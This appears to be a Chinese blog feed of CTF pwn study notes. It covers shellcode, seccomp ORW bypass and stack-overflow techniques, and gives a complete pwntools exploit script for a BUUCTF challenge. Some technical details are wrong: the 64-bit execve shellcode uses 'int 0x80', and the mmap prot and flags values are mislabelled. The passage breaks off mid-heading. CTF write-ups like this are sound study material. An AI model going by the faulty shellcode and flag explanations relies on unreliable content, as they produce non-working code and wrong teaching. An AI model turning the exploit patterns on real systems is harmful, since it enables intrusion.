    <content type="html"><![CDATA[<h1 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><ul><li>就是一段可以插入到程序或系统中并被执行的代码，shellcode的作用就是getshell</li></ul><h2 id="编写"><a href="#编写" class="headerlink" title="编写"></a>编写</h2><p>64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,0x68732f6e69622f ;这里后面那一大串是/bin/sh<br>push rax<br>mov rdi,rsp    ;这两行使rdi指向/bin/sh<br>xor rsi,rsi<br>xor rdx,rdx<br>mov rax,0x3b<br>int 0x80<br></code></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">read_flag=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">mov rdi,rax;</span><br><span class="hljs-string">mov rsi,rsp;</span><br><span class="hljs-string">......</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>shellcode=asm(read_flag)<br></code></pre></td></tr></table></figure><h1 id="沙盒下的orw绕过"><a href="#沙盒下的orw绕过" class="headerlink" title="沙盒下的orw绕过"></a>沙盒下的orw绕过</h1><h2 id="沙箱保护"><a href="#沙箱保护" class="headerlink" title="沙箱保护"></a>沙箱保护</h2><ul><li>对程序加入的一些保护，最常见的是禁用一些系统调用，比如exceve，使我们不可通过系统调用获取到权限，因此只能通过<strong>ROP的方式调用open,read,write</strong>等来读取并打印flag内同</li></ul><h2 id="ORW"><a href="#ORW" class="headerlink" title="ORW"></a>ORW</h2><p>就是open, read,write简写，就是打开，写入，输出flag</p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>利用seccomp-tools查看是否开启了沙箱，以及沙箱中一些允许的syscall</p><p>安装：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cmake">sudo apt <span class="hljs-keyword">install</span> gcc ruby-dev<br>gem <span class="hljs-keyword">install</span> seccomp-tools<br></code></pre></td></tr></table></figure><p>检查：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seccomp-tools dump ./pwn<br></code></pre></td></tr></table></figure><h2 id="开启沙箱"><a href="#开启沙箱" class="headerlink" title="开启沙箱"></a>开启沙箱</h2><h3 id="prctl-函数调用"><a href="#prctl-函数调用" class="headerlink" title="prctl()函数调用"></a>prctl()函数调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/prctl.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">prctl</span><span class="hljs-params">(<span class="hljs-type">int</span> option, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg2, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg3, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg4, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg5)</span>;<br><br><span class="hljs-comment">// 主要关注prctl()函数的第一个参数，也就是option,设定的option的值的不同导致黑名单不同，介绍2个比较重要的option</span><br><span class="hljs-comment">// PR_SET_NO_NEW_PRIVS(38) 和 PR_SET_SECCOMP(22)</span><br><br><span class="hljs-comment">// option为38的情况</span><br><span class="hljs-comment">// 此时第二个参数设置为1，则 禁用execve系统调用 且子进程一样受用</span><br>prctl(<span class="hljs-number">38</span>, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br><br><span class="hljs-comment">// option为22的情况</span><br><span class="hljs-comment">// 此时第二个参数为1，只允许调用read/write/_exit(not exit_group)/sigreturn这几个syscall</span><br><span class="hljs-comment">// 第二个参数为2，则为过滤模式，其中对syscall的限制通过参数3的结构体来自定义过滤规则。</span><br>prctl(<span class="hljs-number">22</span>, <span class="hljs-number">2LL</span>, &amp;v1);<br></code></pre></td></tr></table></figure></li></ul><h3 id="seccomp-系统调用"><a href="#seccomp-系统调用" class="headerlink" title="seccomp()系统调用"></a>seccomp()系统调用</h3><ul><li><p>原型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c">__int64 <span class="hljs-title function_">sandbox</span><span class="hljs-params">()</span><br>&#123;<br>  __int64 v1; <span class="hljs-comment">// [rsp+8h] [rbp-8h]</span><br><br>  <span class="hljs-comment">// 这里介绍两个重要的宏，SCMP_ACT_ALLOW(0x7fff0000U) SCMP_ACT_KILL( 0x00000000U)</span><br>  <span class="hljs-comment">// seccomp初始化，参数为0表示白名单模式，参数为0x7fff0000U则为黑名单模式</span><br>  v1 = seccomp_init(<span class="hljs-number">0LL</span>);<br>  <span class="hljs-keyword">if</span> ( !v1 )<br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br><br>  <span class="hljs-comment">// seccomp_rule_add添加规则</span><br>  <span class="hljs-comment">// v1对应上面初始化的返回值</span><br>  <span class="hljs-comment">// 0x7fff0000即对应宏SCMP_ACT_ALLOW</span><br>  <span class="hljs-comment">// 第三个参数代表对应的系统调用号，0--&gt;read/1--&gt;write/2--&gt;open/60--&gt;exit</span><br>  <span class="hljs-comment">// 第四个参数表示是否需要对对应系统调用的参数做出限制以及指示做出限制的个数，传0不做任何限制</span><br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">2LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">0LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">1LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">60LL</span>, <span class="hljs-number">0LL</span>);<br>  seccomp_rule_add(v1, <span class="hljs-number">0x7FFF0000L</span>L, <span class="hljs-number">231LL</span>, <span class="hljs-number">0LL</span>);<br><br>  <span class="hljs-comment">// seccomp_load-&gt;将当前seccomp过滤器加载到内核中</span><br>  <span class="hljs-keyword">if</span> ( seccomp_load(v1) &lt; <span class="hljs-number">0</span> )<br>  &#123;<br>    <span class="hljs-comment">// seccomp_release-&gt;释放seccomp过滤器状态</span><br>    <span class="hljs-comment">// 但对已经load的过滤规则不影响</span><br>    seccomp_release(v1);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;seccomp error&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>  &#125;<br>  <span class="hljs-keyword">return</span> seccomp_release(v1);<br>&#125;<br></code></pre></td></tr></table></figure></li></ul><h2 id="shellcode的写入"><a href="#shellcode的写入" class="headerlink" title="shellcode的写入"></a>shellcode的写入</h2><p>一般溢出的大小不够写入很长的ROP链，因此提供mmap()函数，从而给出一段栈上的内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *start,<span class="hljs-type">size_t</span> length,<span class="hljs-type">int</span> prot,<span class="hljs-type">int</span> flags,<span class="hljs-type">int</span> fd,<span class="hljs-type">off_t</span> offsize)</span>; <br></code></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *mmap&#123;<br>    <span class="hljs-type">void</span> *addr; <span class="hljs-comment">//映射区首地址，传NULL</span><br>    <span class="hljs-type">size_t</span> length; <span class="hljs-comment">//映射区大小</span><br>    <span class="hljs-comment">//会自动调为4k的整数倍</span><br>    <span class="hljs-comment">//不能为0</span><br>    <span class="hljs-comment">//一般文件多大，length就指定多大</span><br>    <span class="hljs-type">int</span> prot; <span class="hljs-comment">//映射区权限</span><br>    <span class="hljs-comment">//PROT_READ 映射区必须要有读权限</span><br>    <span class="hljs-comment">//PROT_WRITE</span><br>    <span class="hljs-comment">//PROT_READ | PROT_WRITE</span><br>    <span class="hljs-type">int</span> flags; <span class="hljs-comment">//标志位参数</span><br>    <span class="hljs-comment">//MAP_SHARED 修改内存数据会同步到磁盘</span><br>    <span class="hljs-comment">//MAP_PRIVATE 修改内存数据不会同步到磁盘</span><br>    <span class="hljs-type">int</span> fd; <span class="hljs-comment">//要映射文件所对应的文件描述符</span><br>    <span class="hljs-type">off_t</span> offset; <span class="hljs-comment">//映射文件的偏移量，从文件哪个位置开始</span><br>    <span class="hljs-comment">//映射的时候文件指针的偏移量</span><br>    <span class="hljs-comment">//必须是4k的整数倍</span><br>    <span class="hljs-comment">//一般设为0</span><br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2025/01/26/shellcode/1737913055216.png" alt="参数"></p><p>比如说</p><p><code>mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);</code></p><ol><li><strong><code>addr</code></strong>: <code>(void *)0x123000</code><ul><li>这是请求映射的起始地址。<code>0x123000</code> 是一个具体的地址值。如果 <code>mmap</code> 调用成功，内核会尝试将内存映射到这个地址。如果地址不可用，内核会选择一个合适的地址。</li></ul></li><li><strong><code>length</code></strong>: <code>0x1000uLL</code><ul><li>这是请求映射的内存区域的长度，单位是字节。<code>0x1000</code> 是 16 进制表示，等于 4096 字节（1 页）。</li></ul></li><li><strong><code>prot</code></strong>: <code>6</code><ul><li>这是内存区域的保护标志，定义了对该区域的访问权限。<code>6</code> 是 <code>PROT_READ | PROT_WRITE</code> 的组合，表示该区域可以读写。</li></ul></li><li><strong><code>flags</code></strong>: <code>34</code><ul><li>这是映射的标志，定义了映射的类型和行为。<code>34</code> 是 <code>MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS</code> 的组合，具体含义如下：<ul><li><code>MAP_PRIVATE</code>: 创建一个私有映射，对映射区域的修改不会反映到原始文件中。</li><li><code>MAP_FIXED</code>: 强制使用指定的地址 <code>addr</code>，如果该地址不可用，调用会失败。</li><li><code>MAP_ANONYMOUS</code>: 创建一个匿名映射，不与任何文件关联。</li></ul></li></ul></li><li><strong><code>fd</code></strong>: <code>-1</code><ul><li>这是文件描述符，用于指定映射的文件。<code>-1</code> 表示不映射任何文件，通常与 <code>MAP_ANONYMOUS</code> 一起使用。</li></ul></li><li><strong><code>offset</code></strong>: <code>0LL</code><ul><li>这是文件中的偏移量，用于指定映射的起始位置。<code>0LL</code> 表示从文件的开头开始映射。</li></ul></li></ol><p>orw绕过就是open flag，将flag写入某个区域，再write出来</p><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><h3 id="极客大挑战-2019-Not-Bad"><a href="#极客大挑战-2019-Not-Bad" class="headerlink" title="[极客大挑战 2019]Not Bad"></a>[极客大挑战 2019]Not Bad</h3><p> <a href="https://buuoj.cn/challenges#[%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98%202019]Not%20Bad">BUUCTF在线评测</a> </p><p>checksec</p><p>懒得放截图了，反正64位什么都没开</p><p><img src="/2025/01/26/shellcode/1737992637686.png" alt="seccomp-tools"></p><p>只允许read,write,open系统调用</p><p>IDA</p><p><img src="/2025/01/26/shellcode/1737992793323.png" alt="main"></p><p>可以看到从0x123000给分配了0x1000字节空间，权限可写可执行</p><p>直接看第三个函数</p><p><img src="/2025/01/26/shellcode/1737992758135.png" alt="第三个"></p><p>存在栈溢出，但长度小</p><ul><li><p>思路：</p><p>在mmap分配的区域进行orw，并且在这个区域写入flag并输出flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python">orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><span class="hljs-comment"># 写在mmap+0x100的地方</span><br><span class="hljs-comment"># orw写在mmap来执行</span><br></code></pre></td></tr></table></figure><p>现在的问题是如何让rip指向那一块区域</p><p>发现程序有一个<code>jmp rsp</code>可以利用</p><p>那么我们可以构造栈</p><p><img src="/2025/01/26/shellcode/1737993374830.png" alt="栈"></p></li></ul><p>因为函数结束是有<code>leave;ret</code>leave让rsp跑到了序号2（rbp）位置，rbp跑走了，然后ret再让rsp再移动到序号1的位置，此时与read相距0x28+8&#x3D;0x30<br>所以是<code>sub rsp,0x30</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br></code></pre></td></tr></table></figure><p>完整：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&#x27;linux&#x27;</span>, arch=<span class="hljs-string">&#x27;AMD64&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-comment">#r=process(&#x27;./bad&#x27;)</span><br>r=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">29724</span>)<br><span class="hljs-comment"># gdb.attach(r)</span><br>r.recvuntil(<span class="hljs-string">&#x27;have fun!\n&#x27;</span>)<br>mmap=<span class="hljs-number">0x123000</span><br>jmp_rsp=<span class="hljs-number">0x400A01</span><br><br>orw=asm(shellcraft.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;./flag&#x27;</span>))<br>orw+=asm(shellcraft.read(<span class="hljs-number">3</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br>orw+=asm(shellcraft.write(<span class="hljs-number">1</span>,mmap+<span class="hljs-number">0x100</span>,<span class="hljs-number">0x100</span>))<br><br>payload=asm(shellcraft.read(<span class="hljs-number">0</span>,mmap,<span class="hljs-number">0x100</span>))+asm(<span class="hljs-string">&#x27;mov rax,0x123000;call rax&#x27;</span>)<br>payload=payload.ljust(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>payload+=p64(jmp_rsp)+asm(<span class="hljs-string">&#x27;sub rsp,0x30;jmp rsp&#x27;</span>)<br>r.sendline(payload)<br><br>sleep(<span class="hljs-number">1</span>)<br>r.sendline(orw)<br>r.interactive()<br></code></pre></td></tr></table></figure><p>成功得到</p><p><img src="/2025/01/26/shellcode/1737993658927.png" alt="^^"></p>]]></content>
    
    
    <categories>
      
      <category>2025冬令营</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>栈溢出</title>
    <link href="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    <url>/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    
    <content type="html"><![CDATA[<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>原理： 利用危险函数，将返回地址填充到栈帧上的返回地址，从<strong>控制该函数结束时返回到的地方</strong></p><h2 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h2><ul><li>输入<ul><li>gets，直接读取一行，忽略’\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到’\x00’停止</li><li>strcat，字符串拼接，遇到’\x00’停止</li><li>bcopy</li></ul></li></ul><h1 id="初级栈溢出"><a href="#初级栈溢出" class="headerlink" title="初级栈溢出"></a>初级栈溢出</h1><h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><p>利用<code>.text</code>段中的代码</p><p>确定填充长度后   构造payload即可</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><ul><li><p>shellcode</p><p>控制程序执行shellcode代码，常见功能是获取目标系统的shell，我们需向<strong>内存中填充一些可执行的代码</strong></p><p>意味着，<strong>shellcode所在区域需要有可执行的权限</strong></p></li><li><p>原理：</p><p>我们向可执行的区域写入shellcode，然后执行即可</p></li><li><p>pwntools</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">shellcode = asm(shellcraft.sh())<br></code></pre></td></tr></table></figure><p>一键生成shellcode</p></li></ul><h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><ul><li><p>原理：</p><p>利用系统调用获取shell</p></li><li><p>系统调用知识补充：</p><p>跟函数没什么区别，不过我们所调用的函数是系统给的罢了</p><p><strong>系统调用号：rax</strong></p><p><strong>前6个参数：rdi rsi rdx r10 r8 r9</strong></p><ul><li><p>系统调用号</p><p><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x1.png" alt="32位"><br>                                                   <strong>32位</strong><br><img src="/2025/01/22/%E6%A0%88%E6%BA%A2%E5%87%BA/x2.png" alt="64位"><br>                                                   <strong>64位</strong></p></li></ul></li><li><p>ret2syscall</p><ul><li><p>寻找gadgets来控制寄存器为特定的值从而执行<code>execve(&quot;/bin/sh&quot;,NULL,NULL)</code></p><p>工具：<code>ROPgadget --binary 可执行文件名  --only &#39;pop|ret&#39; | grep &#39;eax&#39;</code></p></li></ul></li></ul><h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><ul><li><p>.plt与.got</p><p> <a href="https://blog.csdn.net/2301_80976241/article/details/144333148?ops_request_misc=%7B%22request_id%22:%22990dac9d47abe207078a2f01ce0ce74f%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=990dac9d47abe207078a2f01ce0ce74f&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-144333148-null-null.142%5Ev101%5Epc_search_result_base9&utm_term=plt%E4%B8%8Egot&spm=1018.2226.3001.4187">简单聊聊PLT和GOT_plt与got-CSDN博客</a> </p><p><strong>PLT（Procedure Linkage Table）</strong></p><p>PLT 是一个<strong>跳转表</strong>，跳转到got表，从而执行函数</p><p><strong>工作原理:</strong></p><p>当程序第一次调用共享库中的函数时，会通过 PLT 跳转到一个 stub 代码段。这个 stub 会将控制权转移到动态链接器(ld.so),动态链接器会在 GOT 中查找或解析目标函数的实际地址，<strong>然后更新 GOT 的对应条目</strong>,之后，<strong>再次调用同一函数时，PLT 会直接从 GOT 中读取已解析的地址并跳转到目标函数</strong>。</p><p><strong>GOT（Global Offset Table）</strong></p><p>GOT 是一个表，<strong>存储程序运行时需要使用的全局变量和函数的实际地址。</strong></p><p><strong>工作原理:</strong></p><p>程序加载时，GOT 的条目中存储的是共享库函数的默认入口地址（通常指向 PLT 中的 stub），当动态链接器解析了实际的函数地址后，<strong>会更新 GOT 对应的条目，使其指向正确的目标函数</strong>，之后，主程序对函数的调用直接通过 GOT 获取实际地址，提高效率。</p><p>也就是说，<strong>在使用一次函数后，got内存储的是真实地址</strong></p><p><strong>PLT 和 GOT协同找到正确的函数地址</strong><br>工作流程： 首先主程序中所有对共享库函数的调用，<strong>都会经过 PLT 跳转</strong>。然后PLT 中的第一跳通常指向 GOT 表中的一项。此时GOT 中的条目在未解析时会指向 PLT 中的 stub 地址，动态链接器负责更新 GOT 条目。解析完成后，<strong>GOT 保存目标函数的真实地址</strong>，后续调用直接通过 GOT 加快速度。</p></li><li><p>ret2libc</p><p>也就是利用libc中的system函数和&#x2F;bin&#x2F;sh的地址获取目标系统shell</p><p>利用泄露已知函数的真实地址，计算libc基地址，从而得到system与&#x2F;bin&#x2F;sh的真实地址，从而得到shell</p></li></ul><h1 id="中级栈溢出"><a href="#中级栈溢出" class="headerlink" title="中级栈溢出"></a>中级栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h3><ul><li>在64位程序中，前6个参数由寄存器传递，但大多数时候，难找到每一个寄存器的gadgets，这时可以利用_libc_csu_csu中的gadgets</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">.text:<span class="hljs-number">00000000004005</span>C0 ; <span class="hljs-type">void</span> _libc_csu_init(<span class="hljs-type">void</span>)<br>.text:<span class="hljs-number">00000000004005</span>C0                 public __libc_csu_init<br>.text:<span class="hljs-number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="hljs-number">16</span>o<br>.text:<span class="hljs-number">00000000004005</span>C0                 push    r15<br>.text:<span class="hljs-number">00000000004005</span>C2                 push    r14<br>.text:<span class="hljs-number">00000000004005</span>C4                 mov     r15d, edi<br>.text:<span class="hljs-number">00000000004005</span>C7                 push    r13<br>.text:<span class="hljs-number">00000000004005</span>C9                 push    r12<br>.text:<span class="hljs-number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry<br>.text:<span class="hljs-number">00000000004005</span>D2                 push    rbp<br>.text:<span class="hljs-number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry<br>.text:<span class="hljs-number">00000000004005</span>DA                 push    rbx<br>.text:<span class="hljs-number">00000000004005</span>DB                 mov     r14, rsi<br>.text:<span class="hljs-number">00000000004005</span>DE                 mov     r13, rdx<br>.text:<span class="hljs-number">00000000004005E1</span>                 sub     rbp, r12<br>.text:<span class="hljs-number">00000000004005E4</span>                 sub     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">00000000004005E8</span>                 sar     rbp, <span class="hljs-number">3</span><br>.text:<span class="hljs-number">00000000004005</span>EC                 call    _init_proc<br>.text:<span class="hljs-number">00000000004005F</span>1                 test    rbp, rbp<br>.text:<span class="hljs-number">00000000004005F</span>4                 jz      <span class="hljs-type">short</span> loc_400616<br>.text:<span class="hljs-number">00000000004005F</span>6                 xor     ebx, ebx<br>.text:<span class="hljs-number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="hljs-number">00000000</span>h]<br>.text:<span class="hljs-number">0000000000400600</span><br>.text:<span class="hljs-number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">54</span>j<br><span class="hljs-comment">//主要利用以下模块</span><br>.text:<span class="hljs-number">0000000000400600</span>                 mov     rdx, r13<br>.text:<span class="hljs-number">0000000000400603</span>                 mov     rsi, r14<br>.text:<span class="hljs-number">0000000000400606</span>                 mov     edi, r15d<br>.text:<span class="hljs-number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="hljs-number">8</span>]<br>.text:<span class="hljs-number">000000000040060</span>D                 add     rbx, <span class="hljs-number">1</span><br>.text:<span class="hljs-number">0000000000400611</span>                 cmp     rbx, rbp<br>.text:<span class="hljs-number">0000000000400614</span>                 jnz     <span class="hljs-type">short</span> loc_400600<br>.text:<span class="hljs-number">0000000000400616</span><br>.text:<span class="hljs-number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="hljs-number">34</span>j<br>.text:<span class="hljs-number">0000000000400616</span>                 add     rsp, <span class="hljs-number">8</span><br>.text:<span class="hljs-number">000000000040061</span>A                 pop     rbx<br>.text:<span class="hljs-number">000000000040061B</span>                 pop     rbp<br>.text:<span class="hljs-number">000000000040061</span>C                 pop     r12<br>.text:<span class="hljs-number">000000000040061</span>E                 pop     r13<br>.text:<span class="hljs-number">0000000000400620</span>                 pop     r14<br>.text:<span class="hljs-number">0000000000400622</span>                 pop     r15<br>.text:<span class="hljs-number">0000000000400624</span>                 retn<br>.text:<span class="hljs-number">0000000000400624</span> __libc_csu_init endp<br></code></pre></td></tr></table></figure><ul><li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制 <strong>rbx,rbp,r12,r13,r14,r15</strong> 寄存器的数据。</li><li>从 0x0000000000400600 到 0x0000000000400609，我们可以将<strong>r13 赋给 rdx, 将 r14 赋给 rsi，将 r15d 赋给 edi</strong>（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制 rdi 寄存器的值，只不过只能控制低 32 位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制 r12 与 rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制 rbx 为 0，r12 为存储我们想要调用的函数的地址。</li><li>从 0x000000000040060D 到 0x0000000000400614，我们可以控制 rbx 与 rbp 的之间的关系为 <strong>rbx+1 &#x3D; rbp</strong>，这样我们就<strong>不会执行</strong> loc_400600，进而可以继续执行下面的汇编程序，从而退出这个gadgets。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</li></ul><h2 id="栈迁移"><a href="#栈迁移" class="headerlink" title="栈迁移"></a>栈迁移</h2><p> <a href="https://www.cnblogs.com/ZIKH26/articles/15817337.html">栈迁移的原理&amp;&amp;实战运用 - ZikH26 - 博客园</a> </p><ul><li>换个地方getshell</li></ul><h3 id="使用条件："><a href="#使用条件：" class="headerlink" 